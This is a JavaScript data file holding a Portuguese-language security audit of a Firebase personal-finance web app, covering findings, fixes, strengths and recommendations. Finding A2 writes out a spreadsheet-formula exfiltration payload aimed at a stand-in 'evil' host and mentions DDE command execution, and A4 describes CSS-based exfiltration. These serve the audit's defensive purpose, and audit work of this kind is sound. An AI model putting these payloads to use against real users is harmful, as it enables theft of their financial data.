/**
 * dados-auditoria.mjs — os achados da auditoria, em dado.
 *
 * Separado do gerador de propósito: regerar o PDF depois de fechar um achado
 * é editar ESTE arquivo (mudar `estado`, acrescentar um item) e rodar
 * `node gerar-relatorio.mjs`. O gerador não sabe nada sobre segurança.
 */

export const PROJETO = 'Radar Financeiro (fefe-pss)';
export const DATA = '19 de setembro de 2026';

export const CORES = {
  critica: '#B91C1C',
  alta:    '#EA580C',
  media:   '#D97706',
  baixa:   '#2563EB',
  forte:   '#059669',
};

export const ROTULO_SEV = {
  critica: 'Crítica', alta: 'Alta', media: 'Média',
  baixa: 'Baixa', informativa: 'Informativa',
};

export const CATEGORIAS = [
  { id: 1, nome: 'Banco sem tranca (isolamento de dono)',
    mapeamento: 'Não há backend próprio nem ORM. O mecanismo de isolamento do projeto é (a) o caminho '
      + '<code>users/{uid}/…</code> montado no cliente a partir de <code>auth.currentUser.uid</code> e '
      + '(b) as regras do Firestore em <code>firestore.rules</code>. A auditoria verificou os dois: todo '
      + 'acesso a dado passa por <code>colRef</code>/<code>docRef</code> em <code>js/db.js</code>, e cada '
      + 'coleção tem um <code>match</code> explícito nas regras.' },
  { id: 2, nome: 'Permissão definida no navegador',
    mapeamento: 'O app é mono-usuário por conta Google: não existe papel, admin, organização nem tela '
      + 'privilegiada — logo, não existe o par "gate no frontend × rota sem verificação". O equivalente '
      + 'auditado foi: <em>que regra de escrita o app aplica só na interface e o Firestore não repete?</em>' },
  { id: 3, nome: 'IDOR',
    mapeamento: 'Não há rota HTTP por ID. O equivalente é o acesso direto a documento do Firestore por id. '
      + 'Auditado documento a documento: nenhum id de usuário ou de tenant trafega em parâmetro — o uid vem '
      + 'sempre do token de autenticação, nunca de entrada do usuário.' },
  { id: 4, nome: 'Chaves expostas',
    mapeamento: 'Sem Docker, Helm, Terraform, CI ou <code>.env</code>. Auditados: o código-fonte servido, '
      + '<code>vercel.json</code>, <code>.claude/launch.json</code>, os scripts <code>tmp-*.js</code> '
      + 'versionados e os 94 commits do histórico.' },
  { id: 5, nome: 'Inputs sem tratamento (XSS e afins)',
    mapeamento: 'Frontend em <code>innerHTML</code> puro, sem framework e sem biblioteca de sanitização: '
      + 'a defesa do projeto é a função <code>esc()</code> de <code>js/utils.js:71</code>, aplicada à mão em '
      + 'cada interpolação. Auditadas as 61 ocorrências de <code>innerHTML</code>/<code>outerHTML</code> nos '
      + '25 módulos, mais as saídas em arquivo (CSV e backup JSON).' },
];

export const ACHADOS = [
  {
    id: 'A1', sev: 'alta', cat: 1,
    titulo: 'As regras do Firestore não têm caminho de publicação',
    arquivos: ['firestore.rules:1-131', '(ausente) firebase.json', '(ausente) .github/'],
    trecho: `// firestore.rules:10
// Publicar com:  firebase deploy --only firestore:rules
// (ou colar em Console → Firestore → Regras)`,
    descricao: 'O arquivo <code>firestore.rules</code> é o único controle de acesso real do projeto — não há '
      + 'servidor próprio, e o cliente inteiro roda na máquina do usuário. Mas o repositório <b>não tem '
      + '<code>firebase.json</code></b> (verificado: o arquivo não existe) e <b>não tem pipeline de CI</b> '
      + '(não existe <code>.github/</code>). O deploy na Vercel publica só arquivos estáticos e nunca toca '
      + 'nas regras do Firestore.',
    explorabilidade: 'O comando citado no comentário do próprio arquivo (<code>firebase deploy --only '
      + 'firestore:rules</code>) falha sem <code>firebase.json</code>. Portanto a publicação só pode ter sido '
      + 'manual, colando no console — e nada no repositório prova que aconteceu, nem impede que uma edição '
      + 'futura no arquivo fique só no disco. Se as regras publicadas forem as de projeto novo do Firebase '
      + '(<code>allow read, write: if true</code> por 30 dias, ou a variante que só exige '
      + '<code>request.auth != null</code>), qualquer conta Google autenticada lê e escreve o ramo '
      + '<code>users/{uid}</code> de qualquer outra pessoa — a chave da API e o <code>projectId</code> são '
      + 'públicos por design e estão em <code>js/firebase-init.js:15-26</code>.',
    condicao: 'Explorável somente se as regras publicadas divergirem deste arquivo. Não é verificável a '
      + 'partir do repositório — por isso o achado fica ABERTO até confirmação no console do Firebase.',
    impacto: 'Leitura e escrita do histórico financeiro completo de todos os usuários do app.',
    correcao: 'Criar <code>firebase.json</code> apontando para <code>firestore.rules</code>, publicar, e '
      + 'acrescentar um passo de CI que rode <code>firebase deploy --only firestore:rules</code> a cada '
      + 'merge na <code>main</code>. Fixar as regras com <code>@firebase/rules-unit-testing</code> junto '
      + 'dos testes que já existem em <code>test/</code>.',
    fechado: 'parcial',
    fechadoEm: '19/09/2026',
    fechadoNota: 'O <b>caminho de publicação passou a existir</b>: <code>firebase.json</code> e '
      + '<code>.firebaserc</code> foram criados na raiz, o comentário de <code>firestore.rules</code> '
      + 'deixou de mentir, e <code>.github/workflows/firestore-rules.yml</code> testa as regras contra o '
      + 'emulador e as publica a cada merge na <code>main</code> — testa antes de publicar, de propósito. '
      + 'A suíte está em <code>test/rules/rules.test.mjs</code> (11 casos, ver A1/P5). '
      + '<b>Continua parcial</b> pela mesma razão de sempre: se o que está publicado HOJE no console '
      + 'confere com o arquivo não se verifica a partir do repositório. Fecha por inteiro na primeira '
      + 'publicação pelo workflow, que sobrescreve o que estiver lá.',
  },
  {
    id: 'A2', sev: 'media', cat: 5,
    titulo: 'Injeção de fórmula no CSV exportado',
    arquivos: ['js/mes.js:595', 'js/mes.js:596-606'],
    trecho: `js/mes.js:595
  const celula = (v) => \`"\${String(v ?? '').replace(/"/g, '""')}"\`;

js/mes.js:598
      l.data || '', l.desc || '', cat?.name || '', l.origem,`,
    descricao: 'A função <code>celula()</code> trata a sintaxe do CSV (aspas duplicadas), mas não neutraliza '
      + 'o primeiro caractere. Uma descrição que comece com <code>=</code>, <code>+</code>, <code>-</code>, '
      + '<code>@</code>, TAB ou CR é interpretada como <b>fórmula</b> por Excel, LibreOffice Calc e Google '
      + 'Sheets ao abrir o arquivo — as aspas em volta não impedem isso.',
    explorabilidade: 'A coluna <code>descricao</code> não é digitada só pelo usuário: ela vem do parse de '
      + 'fatura em PDF (<code>js/pdf-import.js</code>) e de extrato CSV/OFX/PDF '
      + '(<code>js/parsers/</code>), ou seja, de um arquivo emitido por terceiro. Um nome de estabelecimento '
      + 'do tipo <code>=HYPERLINK("https://evil/?d="&amp;A1;"Erro")</code> atravessa o app intacto — a '
      + 'gravação não filtra, e <code>esc()</code> só atua na saída HTML — e vira fórmula viva na planilha '
      + 'de quem exportar o mês. Em Excel, o caminho <code>=cmd|…</code> (DDE) ainda dispara diálogo de '
      + 'execução em instalações legadas.',
    condicao: 'Requer que a vítima abra o CSV exportado numa planilha. Nenhuma configuração especial.',
    impacto: 'Exfiltração de dados da planilha para um domínio externo, ou execução de comando em Excel com '
      + 'DDE habilitado.',
    correcao: 'Prefixar com apóstrofo (ou espaço) toda célula cujo primeiro caractere esteja em '
      + '<code>= + - @ \\t \\r</code>, dentro da própria <code>celula()</code> — um ponto só, e o CSV do '
      + 'backup em <code>js/db.js</code> não é afetado por ser JSON.',
    fechado: 'sim',
    fechadoEm: '19/09/2026',
    fechadoNota: 'A regra virou <code>csvCelula()</code> em <code>js/utils.js</code> — e não ficou dentro '
      + 'de <code>_exportarCSV</code> por dois motivos: vale para todo CSV que o app venha a exportar, e '
      + '<code>utils.js</code> é o módulo que um teste em Node alcança sem arrastar Chart.js nem o '
      + 'Firestore. A coluna <code>valor</code> ganhou <code>csvNumero()</code>, separada de propósito: o '
      + '<code>-</code> da despesa casa com o regex, e prefixá-lo com apóstrofo transformaria todo gasto '
      + 'em texto — a planilha deixaria de somar a coluna, que é a razão de ela existir. '
      + 'Fixado por <code>test/csv.test.mjs</code> (10 casos: os seis caracteres, a fórmula de '
      + 'exfiltração, o que não deve mudar, e o negativo continuando numérico).',
  },
  {
    id: 'A3', sev: 'media', cat: 4,
    titulo: 'Scripts de CDN carregados sem Subresource Integrity',
    arquivos: ['index.html:9', 'index.html:11', 'ferramentas/dump-fatura.html:7'],
    trecho: `index.html:9
  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
index.html:11
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>`,
    descricao: 'Chart.js e PDF.js entram de CDN de terceiro como <code>&lt;script&gt;</code> global, sem '
      + 'atributo <code>integrity</code> e sem <code>crossorigin</code>. A CSP em <code>vercel.json:24</code> '
      + 'autoriza os dois hosts, o que é correto, mas autorizar o host não verifica o conteúdo.',
    explorabilidade: 'Os dois scripts rodam na mesma origem do app, no mesmo documento em que '
      + '<code>window._FB</code> expõe a instância autenticada do Firestore '
      + '(<code>js/firebase-init.js:33</code>). Um arquivo alterado no CDN — comprometimento do provedor, '
      + 'sequestro de conta do pacote, ou envenenamento de resposta — executa com acesso total ao ramo '
      + '<code>users/{uid}</code> do usuário logado: pode ler tudo e exfiltrar por '
      + '<code>connect-src https://*.googleapis.com</code>, que a própria CSP libera.',
    condicao: 'Requer comprometimento do CDN ou da rota até ele. Não depende de nada no app.',
    impacto: 'Execução remota de código no contexto autenticado; leitura e escrita de todos os dados '
      + 'financeiros do usuário.',
    correcao: 'Acrescentar <code>integrity="sha384-…"</code> e <code>crossorigin="anonymous"</code> nas três '
      + 'tags, com o hash da versão fixada (ambas já estão pinadas por versão, então o hash é estável). '
      + 'Alternativa mais forte: versionar os dois arquivos em <code>vendor/</code> e servi-los da própria '
      + 'origem, o que também permitiria apertar o <code>script-src</code> para <code>&#39;self&#39;</code>.',
    fechado: 'sim',
    fechadoEm: '19/09/2026',
    fechadoNota: 'As três tags ganharam <code>integrity</code> (sha384) e '
      + '<code>crossorigin="anonymous"</code>. <b>Verificado no navegador</b>: Chart.js 4.4.0 e PDF.js '
      + '3.11.174 carregam, e um hash trocado de propósito é recusado — o console reporta '
      + '"Failed to find a valid digest", e o digest que ele calculou bate com o que está na tag. '
      + '<b>Fica um ponto descoberto, e está escrito no código</b> '
      + '(<code>js/pdf-import.js</code>, acima de <code>GlobalWorkerOptions.workerSrc</code>): o '
      + '<i>worker</i> do PDF.js é carregado pela própria biblioteca, por URL, e não existe '
      + '<code>integrity</code> para worker. Ele continua verificado só pelo host. O hash dele ficou '
      + 'registrado no comentário, para o dia em que se quiser travá-lo por outro caminho.',
  },
  {
    id: 'A4', sev: 'baixa', cat: 5,
    titulo: "CSP com 'unsafe-inline' em style-src e img-src aberto a https:",
    arquivos: ['vercel.json:24'],
    trecho: `vercel.json:24
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; …
 img-src 'self' data: https: blob:;"`,
    descricao: '<code>script-src</code> está corretamente sem <code>&#39;unsafe-inline&#39;</code> (foi o que '
      + 'motivou extrair <code>js/firebase-init.js</code>), mas <code>style-src</code> ainda o traz, e '
      + '<code>img-src</code> aceita qualquer host <code>https:</code>.',
    explorabilidade: 'Não é explorável sozinho: é a camada que deixaria de conter um XSS caso um apareça. '
      + 'Com <code>&#39;unsafe-inline&#39;</code> em <code>style-src</code>, uma injeção de atributo '
      + '<code>style</code> permite exfiltração por CSS (seletor de atributo + <code>background:url()</code>); '
      + 'com <code>img-src https:</code> o destino dessa exfiltração pode ser qualquer domínio.',
    condicao: 'Exige um XSS pré-existente. Nenhum foi encontrado nesta auditoria.',
    impacto: 'Redução da defesa em profundidade — amplia o alcance de um XSS futuro.',
    correcao: 'O projeto usa atributos <code>style=</code> em muitos módulos, então remover '
      + '<code>&#39;unsafe-inline&#39;</code> exige migrá-los para classe (trabalho real, não de uma linha). '
      + 'Ganho barato e imediato: trocar <code>img-src … https:</code> por uma lista dos hosts realmente '
      + 'usados (<code>&#39;self&#39; data: blob: https://lh3.googleusercontent.com</code>, para o avatar '
      + 'do Google).',
    fechado: 'parcial',
    fechadoEm: '19/09/2026',
    fechadoNota: '<b><code>img-src</code> fechado.</b> A correção acima supunha o avatar do Google; '
      + 'a verificação mostrou que <b>o app não carrega imagem externa nenhuma</b> — nenhum '
      + '<code>&lt;img&gt;</code>, nenhum <code>favicon</code>, nenhum <code>url()</code> de CSS fora das '
      + 'fontes (que caem em <code>font-src</code>); todos os ícones são SVG inline. A diretiva ficou '
      + '<code>img-src &#39;self&#39; data: blob:</code>, sem host externo algum. '
      + '<b><code>style-src</code> continua aberto</b>, e é trabalho de uma rodada, não de uma linha: '
      + 'medido em 19/09/2026, há <b>100 atributos <code>style="…"</code></b> — 92 nos módulos '
      + '(<code>ajustes.js</code> 21, <code>mes.js</code> 12, <code>adiante.js</code> 11) e 8 no '
      + '<code>index.html</code>. 28 deles são um <code>margin:0</code> repetido, que vira classe; o '
      + 'punhado restante tem valor calculado em tempo de render (barra de progresso, fatia da rosca, cor '
      + 'da categoria) e precisa de variável CSS escrita depois do <code>innerHTML</code>. Tirar '
      + '<code>&#39;unsafe-inline&#39;</code> antes disso quebra a interface <i>em silêncio</i>: o '
      + 'navegador ignora o atributo sem lançar exceção. Registrado com o número medido na issue 6.',
  },
  {
    id: 'A5', sev: 'baixa', cat: 4,
    titulo: 'Configuração do Firebase embutida no código, sem trava de origem verificável',
    arquivos: ['js/firebase-init.js:14-27', 'histórico git (7 commits)'],
    trecho: `js/firebase-init.js:15
  apiKey: "AIzaSyCZ_xc7UJsIsHI_M8GvxggtcYu2cBunqFo",
  authDomain: "fefe-df577.firebaseapp.com",
  projectId: "fefe-df577",`,
    descricao: 'A chave está no código-fonte e no histórico (<code>git log -p</code> mostra a chave entrando '
      + 'e saindo do <code>index.html</code> em 7 commits, até a extração para '
      + '<code>js/firebase-init.js</code>). <b>Isto não é um vazamento de segredo</b>: a chave de API do '
      + 'Firebase Web é pública por desenho — ela identifica o projeto, não autoriza nada. Está registrada '
      + 'como informação de postura, não como falha de código.',
    explorabilidade: 'Com <code>apiKey</code> + <code>projectId</code>, qualquer pessoa consegue falar com o '
      + 'Identity Toolkit do projeto. O que impede abuso são dois controles que ficam <b>fora do '
      + 'repositório</b> e não puderam ser verificados aqui: a lista de <i>domínios autorizados</i> do '
      + 'Firebase Auth e as restrições da chave no Google Cloud. Não há App Check no projeto '
      + '(verificado: nenhuma referência em <code>js/</code>), então não existe atestação de que o cliente é '
      + 'o app legítimo.',
    condicao: 'Só vira risco se os domínios autorizados incluírem curinga ou host de terceiro.',
    impacto: 'Uso da cota do projeto por cliente não autorizado; telas de login hospedadas em outro domínio '
      + 'se a lista de domínios estiver frouxa.',
    correcao: 'Confirmar no console que os domínios autorizados são só o da Vercel e '
      + '<code>localhost</code>; restringir a chave por referenciador HTTP no Google Cloud; avaliar App '
      + 'Check com reCAPTCHA Enterprise. Nada a mudar no código-fonte — não adianta "esconder" a chave.',
    fechado: 'nao',
    fechadoEm: '19/09/2026',
    fechadoNota: '<b>Sem ação no código, e continuará assim.</b> Os três controles ficam no console do '
      + 'Firebase e do Google Cloud, fora do repositório: domínios autorizados restritos ao domínio da '
      + 'Vercel e a <code>localhost</code>; chave restrita por referenciador HTTP; e a decisão sobre App '
      + 'Check registrada com o porquê, seja adotar ou dispensar. Enquanto não houver essa confirmação, '
      + 'o achado permanece <b>ABERTO</b> — o mesmo tratamento que a parte não verificável de A1.',
  },
  {
    id: 'A6', sev: 'informativa', cat: 2,
    titulo: 'Regras de integridade aplicadas só no navegador',
    arquivos: ['js/mes.js:856-862', 'js/conferir.js:413-417', 'js/db.js:489', 'js/db.js:607-643'],
    trecho: `js/mes.js:859
      if (!ehReceita && !state.transactions.some(t => t.id === id)) {
        toast('Esta linha veio de um extrato. Apague o lote inteiro em Importar.', 'warning');
        return;
      }`,
    descricao: 'Quatro regras vivem só no cliente: a recusa de apagar linha de extrato pela tabela '
      + '(<code>mes.js</code> e <code>conferir.js</code>), a lista branca '
      + '<code>WIPABLE_COLLECTIONS</code> do apagar-coleção, e a validação estrutural do backup restaurado. '
      + 'As regras do Firestore permitem <code>delete</code> em qualquer documento do próprio ramo.',
    explorabilidade: 'Contornável pelo console do navegador, mas <b>o alvo é o dado do próprio usuário</b>: '
      + 'não há travessia de fronteira de dono. É um invariante de consistência de dados, não de segurança. '
      + 'Registrado para a categoria ficar honesta — é o único par "regra no navegador × servidor não '
      + 'repete" que existe no projeto, já que não há papéis nem área administrativa.',
    condicao: 'Sem impacto de confidencialidade ou integridade entre usuários.',
    impacto: 'Nenhum de segurança. O usuário pode deixar a própria base inconsistente.',
    correcao: 'Nenhuma ação exigida. Se um dia houver conta compartilhada, o invariante precisa subir para '
      + 'as regras.',
    fechado: 'na',
    fechadoEm: '19/09/2026',
    fechadoNota: 'Revisto na rodada de correções e <b>deliberadamente não mexido</b>. Subir estes '
      + 'invariantes para as regras hoje custaria complexidade sem fechar nada: o alvo é o dado do próprio '
      + 'usuário e não há travessia de fronteira de dono. A condição que mudaria isso é a mesma de antes — '
      + 'conta compartilhada.',
  },
];

export const FORTES = [
  { t: 'Isolamento por caminho em 100% dos acessos',
    e: 'js/db.js:31-41 — <code>colRef</code>/<code>docRef</code> montam sempre '
     + '<code>users/{getUid()}/{col}</code>, e <code>getUid()</code> (js/auth.js:30) lê '
     + '<code>auth.currentUser.uid</code>, nunca entrada do usuário. Os três acessos que não passam por eles '
     + '— js/extratos.js:242, js/extratos.js:248, js/db.js:524 — repetem o mesmo padrão com o uid do token e '
     + 'abortam quando ele falta.' },
  { t: 'Regras do Firestore negam tudo fora do ramo do dono',
    e: 'firestore.rules:127-129 — <code>match /{document=**} { allow read, write: if false; }</code>, e cada '
     + 'uma das 9 coleções tem <code>match</code> explícito com <code>isOwner(uid) &amp;&amp; verified()</code> '
     + '(linhas 45-118). Nenhum curinga permissivo dentro de <code>/users/{uid}</code>.' },
  { t: 'Validação de campo no servidor, não só no cliente',
    e: 'firestore.rules:48-53 (valor entre ±10.000.000, descrição ≤ 500, ≤ 40 campos), 98 (nome de categoria '
     + '≤ 60), 105 (padrão de regra ≤ 300), 81 e 91 (≤ 5.000 aportes). O limite que o app aplica em '
     + '<code>js/db.js</code> é repetido nas regras.' },
  { t: 'Sem IDOR: nenhum identificador de dono vem de entrada',
    e: 'Percorridos todos os pontos de leitura/escrita dos 25 módulos. O único id que o usuário controla é o '
     + 'id de documento no restore de backup (js/db.js:693), e ele é filtrado contra travessia de caminho '
     + '(<code>id.includes(&#39;/&#39;)</code>, tamanho ≤ 200) e gravado sob o uid do chamador.' },
  { t: 'esc() aplicado em toda interpolação de dado em innerHTML',
    e: 'Varridas as 61 ocorrências de <code>innerHTML</code>/<code>outerHTML</code>/<code>insertAdjacentHTML</code>. '
     + 'Verificados um a um os pontos que recebem texto de terceiro: descrição de extrato '
     + '(js/extratos.js:459), nome de arquivo de fatura (js/importar.js:274), nome de cartão '
     + '(js/cartao.js:152, js/utils.js:datalistCartoes), padrão de regra (js/ajustes.js:111), nome de '
     + 'categoria (js/mes.js:557), tabela do lote (js/importar.js:300-303), preview da fatura '
     + '(js/pdf-import.js:665-686). Todos passam por <code>esc()</code>, que escapa '
     + '<code>&amp; &lt; &gt; &quot; &#39; /</code> (js/utils.js:71-77).' },
  { t: 'Nenhum atributo HTML montado sem aspas, nenhum href/src dinâmico',
    e: 'Grep por <code>&lt;tag …=${</code> e por <code>href="${</code>/<code>src="${</code> em js/: zero '
     + 'ocorrências. Não há URL controlada por usuário em <code>href</code>, logo não há vetor '
     + '<code>javascript:</code>.' },
  { t: 'Sem eval, sem new Function, sem document.write',
    e: 'Grep nos 25 módulos e no index.html: zero ocorrências.' },
  { t: 'Os dois canais de saída de texto escapam',
    e: 'js/utils.js:135-139 — <code>toast()</code> passa mensagem, título e ícone por <code>esc()</code>, o '
     + 'que neutraliza as ~20 mensagens que interpolam <code>err.message</code> e nome de categoria. '
     + 'js/utils.js:380 — os chips de insight escapam tipo, ícone e texto, inclusive o nome de categoria de '
     + 'js/utils.js:263.' },
  { t: 'Restore de backup valida antes de gravar',
    e: 'js/db.js:607-643 — teto de 50 MB, tipo do arquivo, bloqueio de <code>__proto__</code>/'
     + '<code>prototype</code> por <code>hasOwnProperty</code> (e não pela checagem ingênua que dispara em '
     + 'todo objeto), lista branca de 7 coleções, teto de 50.000 itens, faixa de valor e tamanho de '
     + 'descrição. js/db.js:693 rejeita id com barra.' },
  { t: 'Apagar coleção tem lista branca',
    e: 'js/db.js:489 e 516-518 — <code>wipeCollection</code> recusa qualquer nome fora de '
     + '<code>transactions, incomes, budgets, assets, goals</code>, o que impede montar um caminho arbitrário '
     + 'pelo argumento.' },
  { t: 'CSP sem unsafe-inline em script-src',
    e: 'vercel.json:24 — <code>script-src</code> lista hosts fixos, <code>object-src &#39;none&#39;</code>, '
     + '<code>base-uri &#39;self&#39;</code>, <code>default-src &#39;self&#39;</code>. Acompanhada de HSTS '
     + 'com preload, <code>nosniff</code>, <code>Referrer-Policy</code> e <code>Permissions-Policy</code> '
     + 'fechando câmera, microfone, geolocalização e pagamento (vercel.json:6-21).' },
  { t: 'Nenhum segredo real no histórico git',
    e: '94 commits varridos por <code>apiKey|secret|token|password|AIza|PRIVATE KEY</code>: só a chave '
     + 'pública do Firebase. <code>git log --diff-filter=A</code> confirma que nenhum backup de dados '
     + 'pessoais foi commitado — o .gitignore cobre <code>*-backup-*.json</code>, <code>tmp-*.json</code> e '
     + '<code>.env*</code>. Os quatro <code>tmp-*.js</code> versionados foram lidos: só lógica de '
     + 'arrumação, sem uid nem credencial.' },
  { t: 'A ferramenta auxiliar publicada não injeta HTML',
    e: 'ferramentas/dump-fatura.html — apesar de ser servida publicamente pela Vercel, escreve o conteúdo do '
     + 'PDF por <code>textContent</code> (linhas 140, 197, 201, 206, 221) e só usa '
     + '<code>innerHTML</code> para limpar (linhas 131, 136, 181).' },
];

export const RECOMENDACOES = [
  { p: 'P1', t: 'Confirmar e automatizar a publicação das regras do Firestore',
    d: 'Abrir o console do Firebase e comparar, regra a regra, com <code>firestore.rules</code>. Em seguida '
     + 'criar <code>firebase.json</code> e um passo de CI que publique a cada merge. É o único controle que '
     + 'separa os dados de um usuário dos de outro — tudo o mais no projeto depende dele estar de pé.',
    ref: 'A1' },
  { p: 'P2', t: 'Neutralizar fórmula no CSV e assinar os scripts de CDN',
    d: 'Duas correções pequenas e independentes: prefixo de apóstrofo em <code>celula()</code> '
     + '(js/mes.js:595) e <code>integrity</code>+<code>crossorigin</code> nas três tags de CDN. Juntas '
     + 'fecham os dois achados de severidade média.',
    ref: 'A2, A3' },
  { p: 'P3', t: 'Verificar a trava de origem da chave do Firebase',
    d: 'Domínios autorizados no Firebase Auth e restrição por referenciador no Google Cloud. Nada a mudar no '
     + 'código; é conferência de console, e vale marcar no calendário para não se perder.',
    ref: 'A5' },
  { p: 'P4', t: 'Apertar img-src e planejar a saída do unsafe-inline em style-src',
    d: 'Trocar <code>https:</code> por uma lista de hosts é de uma linha. Remover '
     + '<code>&#39;unsafe-inline&#39;</code> exige migrar os atributos <code>style=</code> para classe — '
     + 'trabalho de uma rodada inteira, e só vale a pena depois de P1 a P3.',
    ref: 'A4' },
  { p: 'P5', t: 'Fixar as regras com teste automatizado',
    d: 'O projeto já tem <code>test/*.test.mjs</code> rodando em Node puro. Acrescentar '
     + '<code>@firebase/rules-unit-testing</code> sobre o emulador transformaria "as regras estão certas" '
     + 'numa afirmação verificável, em vez de uma leitura.',
    ref: 'A1' },
];
